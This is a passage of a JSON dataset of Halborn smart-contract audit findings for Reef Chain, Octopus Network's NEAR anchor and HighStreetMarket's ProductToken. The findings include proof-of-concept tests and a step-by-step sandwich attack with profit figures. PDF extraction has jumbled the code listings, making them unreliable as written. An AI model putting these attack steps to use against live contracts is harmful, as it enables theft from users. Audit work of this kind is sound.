        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The to_ascii_hex utility function defined in modules/evm-accounts/src/ lib.rs when creating a new Vec<u8> from the user-supplied data slice with a Vec::with_capacity method does not validate if the capacity of the new vector exceeds the maximum allowed capacity. Code Location: Listing 10: modules/currencies/src/lib.rs (Lines 313) 312 pub fn to_ascii_hex ( data : &[ u8 ]) -> Vec < u8 > { 313 314 let mut r = Vec :: with_capacity ( data . len () * 2) ; let mut push_nibble = | n | r . push ( if n < 10 { b '0 ' + n } else { b 'a ' - 10 + n }) ; for & b in data . iter () { push_nibble ( b / 16) ; push_nibble ( b % 16) ; } r 315 316 317 318 319 320 } Risk Level: Likelihood - 1 Impact - 2 Recommendations: Validate if the new capacity (data.len()* 2) does not exceed isize::MAX bytes. 24 Remediation: SOLVED: Reef fixed the issue in commit (6b826f7ca16d1a30f3fa55f0606d0b94b69b2b3a)[https://github.com/reef-defi/reef-chain/pull/37/commits/6b826f7ca16d1a30f3fa55f0606d0b94b69b2b3a]. 25 FUZZING 26 Introduction: Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Halborn custom-built scripts leverage libFuzzer and cargo-fuzz for in-process, coverage-guided fuzz testing. The fuzzer tracks which areas of the code are reached and generates mutations on the corpus of input data to maximize the code coverage. The code coverage information is provided by LLVMs SanitizerCoverage instrumentation. ",
        "labels": [
            "Halborn",
            "Reef_Chain_Substrate",
            "Severity: Informational"
        ]
    },
    {
        "title": "TOKEN PRICE MAINTAINER AS WELL AS RELAYER CAN BE SET TO THE OWNERS ACCOUNTID",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The set_token_price_maintainer_account() and set_relayer_account() meth- ods implemented for the AppchainAnchor struct and can be found in appchain -anchor/src/user_actions/settings_manager.rs do not validate the Accoun- tId passed to them to ensure that no matches that of the owner, allowing a malicious owner to bypass the privilege separation point in this case. Code Location: Listing 1: appchain-anchor/src/user_actions/settings_manager.rs 284 fn set_token_price_maintainer_account (& mut self , account_id :  AccountId ) { 285 286 287 288 289 } self . assert_owner () ; let mut anchor_settings = self . anchor_settings . get () . unwrap () ; anchor_settings . token_price_maintainer_account = account_id ; self . anchor_settings . set (& anchor_settings ); Listing 2: appchain-anchor/src/user_actions/settings_manager.rs 291 fn set_relayer_account (& mut self , account_id : AccountId ) { 292 293 294 295 296 } self . assert_owner () ; let mut anchor_settings = self . anchor_settings . get () . unwrap () ; anchor_settings . relayer_account = account_id ; self . anchor_settings . set (& anchor_settings ); Proof of Concept:: The following test case was created as a PoC: 14 Listing 3 let result = settings_actions :: let total_supply = common :: to_oct_amount ( TOTAL_SUPPLY ); let ( root , _ , _registry , anchor , _) = common :: init ( 1 fn test_set_owner_as_maintainer () { 2 3  total_supply , false ); 4  set_token_price_maintainer_account (& root , & anchor , & root ); 5 6 7 8  anchor ); 9  token_price_maintainer_account ; 10 11 } result . assert_success () ; let result2 = view! ( anchor . get_owner () ); let owner = result2 . unwrap_json :: < String >() ; let anchor_settings = anchor_viewer :: get_anchor_settings (& let maintainer = anchor_settings . assert! ( owner == maintainer ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: The two affected functions must validate that the AccountId passed to them does not match that of the owner and panic otherwise. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 15 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER ACCOUNTID CAN BE SET TO AN INVALID VALUE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The set_owner() method implemented in the AppchainAnchor Struct, which can be found in appchain-anchor/src/lib.rs, does not validate that the AccountId value passed to it actually contains a valid AccountId following the NEARs account ID rules. As a result, an owner who wishes to update pass ownership to another user can erroneously call the function with a string pointing to an invalid NEAR account ID, resulting in complete and irreversible loss of control over the contract from that point forward. Code Location: Listing 4: appchain-anchor/src/lib.rs 398 fn set_owner (& mut self , owner : AccountId ) { 399 400 401 } self . assert_owner () ; self . owner = owner ; Proof of Concept:: The following is a test case developed as a PoC, notice that the test prints Owner is: th!$1$!nv@|!d when finished: Listing 5 let total_supply = common :: to_oct_amount ( TOTAL_SUPPLY ); let ( root , _ , _registry , anchor , _) = common :: init ( anchor . contract . set_owner (\" test \". to_string () ); let result1 = call! ( root , anchor . set_owner (\" th!$_1$_!nv@ | !d \". 1 fn test_set_invalid_owner () { 2 3  total_supply , false ); 4 5  to_string () )); 6 result1 . assert_success () ; 16 let result = view! ( anchor . get_owner () ); println! (\" New owner is : {} \" , result . unwrap_json :: < String >() ); 7 8 9 } Risk Level: Likelihood - 1 Impact - 5 Recommendation: The function must validate that the passed argument is in the form of a valid AccountId before setting the owner. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 17 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF VALIDATION ALLOWS SETTING PERCENTAGES HIGHER THAN A HUNDRED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "method change_maximum_validator_stake_percent() The \"appchain- anchor/src/user_actions/settings_manager.rs\" checks that the percentage value passed to it is less than a 100 and reverts otherwise. However, all the remaining functions allowing the owner to change other percentage values do not perform such checks, allowing percentages to exceed 100%, which would probably cause the contract to crash and panic while rewards are being distributed. in Code Location: Listing 6: appchain-anchor/src/user_actions/settings_manager.rs 127 fn change_maximum_market_value_percent_of_near_fungible_tokens (&  mut self , value : u16 ) { 128 129 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 130 131 assert! ( value ! = protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens , 132 133 134 \" The value is not changed . \" ); protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens = value ; 135 136 } self . protocol_settings . set (& protocol_settings ); Listing 7: appchain-anchor/src/user_actions/settings_manager.rs 138 fn change_maximum_market_value_percent_of_wrapped_appchain_token (&  mut self , value : u16 ) { 139 self . assert_owner () ; 18 140 let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 141 142 assert! ( value ! = protocol_settings .  maximum_market_value_percent_of_wrapped_appchain_token , 143 144 145 \" The value is not changed . \" ); protocol_settings .  maximum_market_value_percent_of_wrapped_appchain_token = value ; 146 147 } self . protocol_settings . set (& protocol_settings ); Listing 8: appchain-anchor/src/user_actions/settings_manager.rs 229 fn change_validator_commission_percent (& mut self , value : u16 ) { 230 231 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 232 233 assert! ( value ! = protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens , 234 235 236 \" The value is not changed . \" ); protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens = value ; 237 238 } self . protocol_settings . set (& protocol_settings ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: Percentage values should always be checked before assigning them to avoid exceeding allowable levels. 19 Remediation Plan: PARTIALLY SOLVED: The Octopus Network team partially solved the issue in commit ef2219a37c5be402cec720d9db03501981c2ca80 Then some checks were removed in commit eaa2a5109bca0522f6a285f53ebe1e366475bbc6 20 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "CASE SENSITIVE CHECK ALLOWS ADDING THE SAME NEAR FUNGIBLE TOKEN MORE THAN ONCE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "function only register_near_fungible_token() The \"appchain- the anchor/src/assets/near_fungible_tokens.rs\" symbol of the token passed to it already exists, however the check is case-sensitive, so it can be bypassed. This allows the owner to register the same token more than once, which can lead to users distributing their funds under different NEAR token contracts instead of one, reducing liquidity and the rewards. in checks if Code Location: Listing 9: appchain-anchor/src/assets/near_fungible_tokens.rs & mut self , symbol : String , name : String , decimals : u8 , contract_account : AccountId , price : U128 , 96 fn register_near_fungible_token ( 97 98 99 100 101 102 103 ) { 104 105 self . assert_owner () ; let mut near_fungible_tokens = self . near_fungible_tokens . get ()  . unwrap () ; 106 107 108 109 110 111 112 113 114 115 assert! ( !near_fungible_tokens . contains (& symbol ) , \" Token '{} ' is already registered . \" , & symbol ); near_fungible_tokens . insert (& NearFungibleToken { metadata : FungibleTokenMetadata { spec : \"ft -1.0.0 \" . to_string () , symbol , name , 21 116 117 118 119 120 121 122 123 124 125 126 127 } decimals , icon : None , reference : None , reference_hash : None , }, contract_account , price_in_usd : price , locked_balance : U128 :: from (0) , bridging_state : BridgingState :: Active , }) ; self . near_fungible_tokens . set (& near_fungible_tokens ); Proof of Concept:: The following test case reproduces the issue and prints the two tokens that were registered with similar names: Listing 10 let total_supply = common :: to_oct_amount ( TOTAL_SUPPLY ); let ( root , _ , _registry , anchor , _) = common :: init ( 1 #[ test ] 2 fn test_same_token_registeration () { 3 4  total_supply , false ); 5 6 7 8 9 10 11 12 13 14 15 16 17 18  , token . metadata . symbol ); 19 20 } }) ; let result = call! ( root , anchor . register_near_fungible_token ( \" HLB \". to_string () , \" Halborn \". to_string () , 2, \" test1 \" . to_string () , U128 :: from (1) )); result . assert_success () ; let result = call! ( root , anchor . register_near_fungible_token ( \" hlb \". to_string () , \" halborn \". to_string () , 2, \" test2 \" . to_string () , U128 :: from (5) )); result . assert_success () ; let result2 = view! ( anchor . get_near_fungible_tokens () ); let tokens = result2 . unwrap_json :: < Vec < NearFungibleToken > >() ; tokens . iter () . for_each (| token |{ println! ( \" Token name : {} , symbol : {} \" , token . metadata . name 22 Risk Level: Likelihood - 3 Impact - 3 Recommendation: The function must validate that the passed token name is not the same as any of the existing tokens before adding it. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 23 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ZERO CHECKS ON AMOUNTS AND PRICES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Checks should be implemented on amount and price values to make sure they are not set to invalid values, including setting such fields to zero. The set_price_of_oct_token() method implemented in the AppchainAnchor struct in \"appchain-anchor/src/lib.rs\" does not employ such checks to validate that the price of the OCT token does not drop to 0. Code Location: Listing 11: appchain-anchor/src/lib.rs let anchor_settings = self . anchor_settings . get () . unwrap () ; assert_eq! ( env :: predecessor_account_id () , anchor_settings . token_price_maintainer_account , \" Only '{} ' can call this function . \" , anchor_settings . token_price_maintainer_account 371 pub fn set_price_of_oct_token (& mut self , price : U128 ) { 372 373 374 375 376 377 378 379 380 381 382 } ); let mut oct_token = self . oct_token . get () . unwrap () ; oct_token . price_in_usd = price ; self . oct_token . set (& oct_token ); Risk Level: Likelihood - 2 Impact - 4 24 Recommendation: A default minimum amount must be checked before setting the price value passed to the function. Remediation Plan: NOT APPLICABLE: The Octopus Network team marked the issue as not appli- cable, as setting OCT to 0 is needed to remove the cross-chain asset transfer restriction. 25 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF UPPER LIMIT CHECKS ALLOWS BLOCKING WITHDRAWALS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The change_unlock_period_of_delegator_deposit() and change_unlock_period_of_validator_deposit () functions in \"appchain-anchor/src/user_actions/settings_manager.rs\" do not check for an upper bound for the values passed to them. These functions allow the owner to set the number of days before validators/delegators can withdraw their rewards. By not checking for an upper bound, the owner can set the values to big numbers that would correspond to years before validators/delegators can actually withdraw their balances. Code Location: Listing 12: appchain-anchor/src/user_actions/settings_manager.rs 193 fn change_unlock_period_of_delegator_deposit (& mut self , value : U64  ) { 194 195 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 196 197 assert! ( value .0 ! = protocol_settings .  unlock_period_of_delegator_deposit .0 , 198 199 200 201 202 } \" The value is not changed . \" ); protocol_settings . unlock_period_of_delegator_deposit = value ; self . protocol_settings . set (& protocol_settings ); 26 Listing 13: appchain-anchor/src/user_actions/settings_manager.rs 182 fn change_unlock_period_of_validator_deposit (& mut self , value : U64  ) { 183 184 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 185 186 assert! ( value .0 ! = protocol_settings .  unlock_period_of_validator_deposit .0 , 187 188 189 190 191 } \" The value is not changed . \" ); protocol_settings . unlock_period_of_validator_deposit = value ; self . protocol_settings . set (& protocol_settings ); Risk Level: Likelihood - 2 Impact - 4 Recommendation: Upper limits should be checked before setting the value. Remediation Plan: RISK ACCEPTED: The Octopus Network team accepted the risk of this finding. 27 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Medium"
        ]
    },
    {
        "title": "MINIMUM VALIDATOR COUNT CAN BE SET TO 0 OR 1",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "change_minimum_validator_count() \"appchain- The anchor/src/user_actions/settings_manager.rs\" guarantee that the minimum validator count set by the owner is not less than 0 or 1 validators at the same time, that directly impacts the security of the chain. A minimum validators constant should be set and checked in that function to make sure validator counts cannot go below that threshold. in not method does Code Location: Listing 14: appchain-anchor/src/user_actions/settings_manager.rs 149 fn change_minimum_validator_count (& mut self , value : U64 ) { 150 151 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 152 153 154 155 156 157 158 } assert! ( value .0 ! = protocol_settings . minimum_validator_count .0 , \" The value is not changed . \" ); protocol_settings . minimum_validator_count = value ; self . protocol_settings . set (& protocol_settings ); Risk Level: Likelihood - 2 Impact - 2 28 Recommendation: The minimum validator count must be compared to a fixed lower amount before being set. Remediation Plan: RISK ACCEPTED: The Octopus Network team accepted the risk stating \"The minimum validator count of the protocol settings will only affect the verification process in the go_booting function, it is just a reference value. Other than that, it does not affect any other functions in the contract or the actual actions/status of the application chain. In some special cases, we can set it to 0 or 1, to change the state of the contract for further operations.\" 29 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF UPPER BOUND CHECKS ON DECIMALS LEADS TO PANICS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The get_market_value_of() function in \"appchain-anchor/src/assets/near_- fungible_tokens.rs\" and \"appchain-anchor/src/assets/wrapped_appchain_to- ken.rs\" uses the decimals value in the respective token as an exponent while raising a power and the value is then stored in a u128 variable. The issue here is that the decimals value is not validated before being used when the token is created, leading to the ability to pass any value in the range of 0-255, which allows the token creator to cause a panic case whenever the get_market_value_of() function is called since the pow() function call would yield a value well beyond the possible range of u128. Code Location: Listing 15: appchain-anchor/src/assets/near_fungible_tokens.rs if let Some ( near_fungible_token ) = self . tokens . get (& symbol ) { amount / u128 :: pow (10 , u32 :: from ( near_fungible_token . 83 pub fn get_market_value_of (& self , symbol : & String , amount : u128 )  -> Balance { 84 85  metadata . decimals )) 86 87 88 89 90 } * near_fungible_token . price_in_usd .0 } else { 0 } Listing 16: appchain-anchor/src/assets/wrapped_appchain_token.rs amount / u128 :: pow (10 , u32 :: from ( self . metadata . decimals )) * 58 pub fn get_market_value_of (& self , amount : u128 ) -> Balance { 59  self . price_in_usd .0 60 } 30 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Upper bounds should be checked before setting the value. Remediation Plan: RISK ACCEPTED: The Octopus Network team accepted the risk of this finding. 31 ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "DEFAULT BRIDGING STATE FOR NEW NEAR FUNGIBLE TOKENS IS ACTIVE WHILE IT SHOULD BE CLOSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The implementation detail document states that newly registered NEAR fungible tokens should have their bridging state set to Closed. \"appchain- However, anchor/src/assets/near_fungible_tokens.rs\" registers the token with the bridging state of Active. the register_near_fungible_token() function in Code Location: Listing 17: appchain-anchor/src/assets/near_fungible_tokens.rs & mut self , symbol : String , name : String , decimals : u8 , contract_account : AccountId , price : U128 , 96 fn register_near_fungible_token ( 97 98 99 100 101 102 103 ) { 104 105 self . assert_owner () ; let mut near_fungible_tokens = self . near_fungible_tokens . get ()  . unwrap () ; 106 107 108 109 110 111 112 113 114 115 assert! ( !near_fungible_tokens . contains (& symbol ) , \" Token '{} ' is already registered . \" , & symbol ); near_fungible_tokens . insert (& NearFungibleToken { metadata : FungibleTokenMetadata { spec : \"ft -1.0.0 \" . to_string () , symbol , name , 32 116 117 118 119 120 121 122 123 124 125 126 127 } decimals , icon : None , reference : None , reference_hash : None , }, contract_account , price_in_usd : price , locked_balance : U128 :: from (0) , bridging_state : BridgingState :: Active , }) ; self . near_fungible_tokens . set (& near_fungible_tokens ); Risk Level: Likelihood - 2 Impact - 2 Recommendation: The function should set the bridging_state value to BridgingState::Closed instead of BridgingState::Active while creating the token. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 33 3.10 (HAL-10) LACK OF VALIDATOR ACCOUNTID VALIDATION ALLOWS USING INVALID ACCOUNTID - LOW ",
        "labels": [
            "Halborn",
            "Octopus_Network_Anchor_NEAR",
            "Severity: Low"
        ]
    },
    {
        "title": "PRODUCTTOKENHIGHBASE CONTRACT IS VULNERABLE TO SANDWICH ATTACKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract ProductTokenHighBase is an ERC20 contract that allows users to buy and sell a product token. The buying and selling price of the token is based on a pricing algorithm called Bonding Curve. This algorithm causes the price of the token to increase with every purchase, meaning that early buyers are rewarded as they can, then, sell the tokens back for a profit. The function buy(uint256 maxPrice_) allows users to buy a product token with a maximum acceptable price. It only allows buying 1 token per call: Listing 1: ProductTokenHighBase.sol 78 function buy ( uint256 maxPrice_ ) external virtual whenNotPaused nonReentrant { if ( endTime [ FEATURE_ENDTIME_BUY ] != 0) { require ( now256 () < endTime [ FEATURE_ENDTIME_BUY ], \" sale is expire \"); } require ( maxPrice_ > 0, \" invalid max price \"); transferFromHighToken ( _msgSender () , address ( this ) , maxPrice_ ); ( uint256 change ) if ( change > 0) { = _buy ( maxPrice_ ); transferHighToken ( _msgSender () , change ); } 79 80 81 82 83 84 85 86 87 88 89 90 } The function sell(uint32 amount_) allows users to sell a product token, returning the equivalent HIGH tokens: 12 Listing 2: ProductTokenHighBase.sol 100 function sell ( uint32 amount_ ) external virtual whenNotPaused nonReentrant { if ( endTime [ FEATURE_ENDTIME_SELL ] != 0) { require ( now256 () < endTime [ FEATURE_ENDTIME_SELL ], \" sale is expire \"); } require ( amount_ > 0, \" Amount must be non - zero . \" ); require ( balanceOf ( _msgSender () ) >= amount_ , \" Insufficient tokens .\" ); uint256 price = _sell ( amount_ ); transferHighToken ( _msgSender () , price ); 101 102 103 104 105 106 107 108 109 } The growth of the price with each purchase is determined by the different bonding curve parameters, which are set in the initialize() function of the ProductTokenHighBase contract: Listing 3: ProductTokenHighBase.sol (Lines 47-50) 27 /* * 28 29 30 31 32 33 34 * @dev initializer function . * * @param _name the name of this token * @param _symbol the symbol of this token * @param _bondingCurve bonding curve instance address * @param _productNft product nft instance address * @param _reserveRatio the reserve ratio in the curve function . Number in parts per million 35 * @param _maxTokenCount the amount of token that will exist for this type . 36 * @param _supplyOffset this amount is used to determine initial price . 37 * @param _baseReserve the base amount of reserve tokens , in accordance to _supplyOffset . 38 * @param _endTime end time is the last time when user can buy and sell ; 39 * 40 */ 41 function initialize ( 42 string memory _name , 13 HIGH = _high ; ProductTokenCore . initialize ( string memory _symbol , address _high , address _bondingCurve , address _productNft , uint32 _reserveRatio , uint32 _maxTokenCount , uint32 _supplyOffset , uint256 _baseReserve , uint256 _endTime 43 44 45 46 47 48 49 50 51 52 ) public virtual initializer { 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 } _name , _symbol , _bondingCurve , _productNft , _reserveRatio , _maxTokenCount , _supplyOffset , _baseReserve ); if ( _endTime > 0) { } updateEndTime ( FEATURE_ENDTIME_MAX , _endTime ); As there are no restriction or cooldown period to sell the product token after its purchase, the buy() function calls are vulnerable to a sandwich attack. Proof of Concept: Based in the parameters found in the 2_deploy_contract.js file: - _reserveRatio the reserve ratio in the curve function. Number in parts per million -> 30000 - _maxTokenCount the amount of token that will exist for this type. -> 250 - _supplyOffset this amount is used to determine initial price. -> 700 - _baseReserve the base amount of reserve tokens. -> 800 14 1. Attacker scans the mempool for 2 ProductTokenHighBase.buy() transactions. 2. Attacker detects 2 ProductTokenHighBase.buy() txs in the mempool coming from user1 and user2. 3. Attacker frontruns both txs and calls himself ProductTokenHighBase .buy(). the exact price 4. If both users had set the maxPrice_ in ProductTokenHighBase.buy() to (ProductTokenHighBase.getCurrentPrice()), their txs would revert. If that was the case, it makes sense to think that they would resubmit their transactions with a higher maxPrice_. On the other hand, if both users had set the maxPrice_ in ProductTokenHighBase.buy() with some margin, their txs would be completed but they would be paying a higher price for the ProductTokenHighBase product token. 5. Attacker backruns both txs (user1 and user2 txs) and sells the product token bought initially, getting a 3.33% profit: Tokens paid initially by the attacker (during the frontrun): 40_547860657636861605 Tokens paid by user1: 42_461906982198102077 Tokens paid by user2: 44_463383637847924478 Total tokens received by the attacker after the sale of the product token (during the backrun): 41_898188427972082682 Profitted tokens after sandwiching 2 users = 1_350327770335221077 % of 3.33% (1_350327770335221077 / 40_547860657636861605)x 100 = profit: With these bonding curve parameters, two additional purchases are needed before selling to make profit. With different bonding curve parameters, it would be possible to profit by just sandwiching one transaction instead of two, increasing this attack likelihood. Risk Level: Likelihood - 3 15 Impact - 5 Recommendation: to is set recommended It the ProductTokenHighBase contract in order that, before a user can profit by selling the product token, a number high enough of buy orders are needed. parameters bonding curve the of On the other hand, perhaps a simpler approach, another possible solution would be to add a cooldown on the sell() function, not allowing users to sell right away after a buy() call. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the following commit IDs: - 3d83211d1720c6cd1ae1cd21631a400c4932bad7 - 27d266184835bdf54aa3c8135a7d2a2a89fc7b37 A cooldown has been added that restricts users from calling sell(), transferFrom() and transfer() functions for a fixed period of time. 16 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_ProductToken",
            "Severity: High"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract ProductTokenHighBase is missing zero address checks in its initializate() function. Every address should be validated and checked that is different from zero. Code location: Listing 4: ProductTokenHighBase.sol HIGH = _high ; ProductTokenCore . initialize ( string memory _name , string memory _symbol , address _high , address _bondingCurve , address _productNft , uint32 _reserveRatio , uint32 _maxTokenCount , uint32 _supplyOffset , uint256 _baseReserve , uint256 _endTime 41 function initialize ( 42 43 44 45 46 47 48 49 50 51 52 ) public virtual initializer { 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 } _name , _symbol , _bondingCurve , _productNft , _reserveRatio , _maxTokenCount , _supplyOffset , _baseReserve ); if ( _endTime > 0) { } updateEndTime ( FEATURE_ENDTIME_MAX , _endTime ); 17 Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 84746701f0463a77d75c0ec8d7444784e594e42d 18 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_ProductToken",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL CALLS WITHIN A LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract ProductTokenHighBase the function tradein() allows users to trade in their Product token for a NFT. Listing 5: ProductTokenHighBase.sol (Lines 122) 116 function tradein ( uint32 amount_ ) external virtual whenNotPaused nonReentrant { if ( endTime [ FEATURE_ENDTIME_TRADEIN ] != 0) { require ( now256 () < endTime [ FEATURE_ENDTIME_TRADEIN ], \" sale is expire \"); } require ( amount_ > 0, \" Amount must be non - zero . \" ); require ( balanceOf ( _msgSender () ) >= amount_ , \" Insufficient tokens .\" ); _tradein ( amount_ ); 117 118 119 120 121 122 123 } Listing 6: ProductTokenCore.sol (Lines 466) (, uint256 fee ) = _sellReturn ( amount_ ); 453 function _tradein ( uint32 amount_ ) internal virtual { 454 455 456 457 458 459 460 461 462 _burn ( _msgSender () , amount_ ); // redeem value should give to supplier uint256 tradinReturn = _tradinReturn ( amount_ ); // 50% of fee and redeem price are for supplier _updateSupplierFee ( fee * FEE_MULTIPLIER / FEE_RATE_IN_SELL + tradinReturn ); // 50% of fee , is for plateform _updatePlateformFee ( fee * ( FEE_RATE_IN_SELL - FEE_MULTIPLIER ) / FEE_RATE_IN_SELL ); nft . mintBatch ( _msgSender () , tradeinCount , amount_ ); 463 464 465 466 467 19 tradeinCount = tradeinCount + amount_ ; tradeinReserveBalance = tradeinReserveBalance + tradinReturn ; emit Tradein ( _msgSender () , amount_ , tradinReturn , fee ); 468 469 470 471 472 } If a user trades in 10 Product tokens, 10 NFTs will be minted through the function ProductNft.mintBatch(): Listing 7: ProductNft.sol (Lines 145) 140 function mintBatch ( address to_ , uint256 start_ , uint256 count_ ) external { require ( minters [ _msgSender () ] == true , ' permission denied '); require ( to_ != address (0) , ' invalid receiver '); require ( start_ + count_ < maxCount , \" cap exceeded \" ); for ( uint256 index = start_ ; index < start_ + count_ ; index ++) { _safeMint ( to_ , index ); } emit MintBatch ( to_ , start_ , count_ ); 141 142 143 144 145 146 147 148 149 } The gas cost of minting 10 NFTs is 1.258.049. This would already exceed, for example, Metamask default gas limit of 1,200,000 GWEI. Users not aware of this may submit the transaction to then find out that the transaction have failed with an Out of gas message. A transaction of 1,200,000 GWEI in gas is worth $451.95 (date: 01/01/2022). This is the potential loss that can happen to a user not aware of this. For that reason, it is recommended to limit the amount_ parameter of the tradein() function. 20 Proof of Concept: Risk Level: Likelihood - 2 Impact - 2 21 Recommendation: It is recommended to limit the amount_ parameter of the tradein() function, making sure that is, for example, lower than 10. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 56f794ef686c2840afd35f7255ce8cb23bba8127 22 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_ProductToken",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the following contracts there are functions marked as public but they are never directly called within the same contract or in any of their descendants: BancorBondingCurve.sol - calculatePriceForNTokens() (BancorBondingCurve.sol#38-64) - calculatePurchaseReturn() (BancorBondingCurve.sol#81-109) - calculateSaleReturn() (BancorBondingCurve.sol#125-159) ProductTokenCore.sol - getCurrentPrice() (ProductTokenCore.sol#260-263) - calculateBuyReturn() (ProductTokenCore.sol#329-334) - calculateSellReturn() (ProductTokenCore.sol#363-367) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the functions are not intended to be called internally or by their descendants, it is better to mark all of these functions as external to reduce gas costs. Remediation Plan: SOLVED: The HighStreetMarket team solved the issue in the commit ID 674c5f7a814acf33bafaedd43c94df0731e69c73 23 ",
        "labels": [
            "Halborn",
            "HighStreetMarket_ProductToken",
            "Severity: Informational"
        ]
    },
    {
        "title": "TYPO IN FUNCTION NAMES AND EVENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/HighStreetMarket_ProductToken_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
